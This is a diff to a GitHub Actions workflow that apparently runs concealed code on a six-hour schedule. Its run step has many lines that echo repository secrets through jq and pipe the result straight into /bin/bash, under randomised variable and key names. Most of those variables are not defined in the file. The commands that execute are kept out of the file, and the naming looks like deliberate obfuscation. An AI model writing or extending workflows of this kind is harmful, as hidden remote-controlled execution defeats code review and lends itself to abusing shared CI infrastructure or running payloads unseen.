@@ -2,28 +2,33 @@ name: xiaolouzhu6789
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 5/6 * * *'
-
-jobs:  # 30010
+    - cron: '28 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: xiaolouzhu6789
         env:
-          g36: ${{ secrets.g36 }}
+          t611: ${{ secrets.t611 }}
         run: |
-          echo $g36 | jq -r .omrmg9545 | /bin/bash
-          echo $owok48 | jq -r .lzgyg40501 | /bin/bash
-          echo $gcm40 | jq -r .fr951 | /bin/bash
-          echo $bkch2 | jq -r .wejwo21279 | /bin/bash
-          echo $kfy12 | jq -r .pyp9275 | /bin/bash
-          echo $tr838 | jq -r .m51023 | /bin/bash
-          echo $uufe5 | jq -r .nyglm39388 | /bin/bash
-          echo $sqid21345 | jq -r .boha3993 | /bin/bash
-          echo $fjmio763 | jq -r .ih81741 | /bin/bash
-          echo $ek478 | jq -r .nbiid182 | /bin/bash
-          echo $rfo29944 | jq -r .kxu4881 | /bin/bash
-          echo $fvnar7 | jq -r .uux13644 | /bin/bash
-          echo $jl70 | jq -r .m82663 | /bin/bash
+          echo $t611 | jq -r .waw007 | /bin/bash
+          echo $yurn9 | jq -r .fmeqx9 | /bin/bash
+          echo $bkige74072 | jq -r .zaiq14873 | /bin/bash
+          echo $btnh88017 | jq -r .lai62582 | /bin/bash
+          echo $qa76 | jq -r .j231 | /bin/bash
+          echo $fumy93181 | jq -r .oido8 | /bin/bash
+          echo $smsj063 | jq -r .lb37055 | /bin/bash
+          echo $sgu81446 | jq -r .f7 | /bin/bash
+          echo $d962 | jq -r .ja84 | /bin/bash
+          echo $fc712 | jq -r .u44898 | /bin/bash
+          echo $xenx8420 | jq -r .vr18 | /bin/bash
+          echo $ojpic30299 | jq -r .la8978 | /bin/bash
+          echo $cc27496 | jq -r .v4 | /bin/bash
+          echo $ig63 | jq -r .xul36 | /bin/bash
+          echo $zswdg8 | jq -r .gmny8823 | /bin/bash
+          echo $jmxc4284 | jq -r .etw907 | /bin/bash
+          echo $yw7780 | jq -r .eijez62455 | /bin/bash
+          echo $lbr21940 | jq -r .ln19362 | /bin/bash
+          echo $igwd650 | jq -r .rkc440 | /bin/bash
 
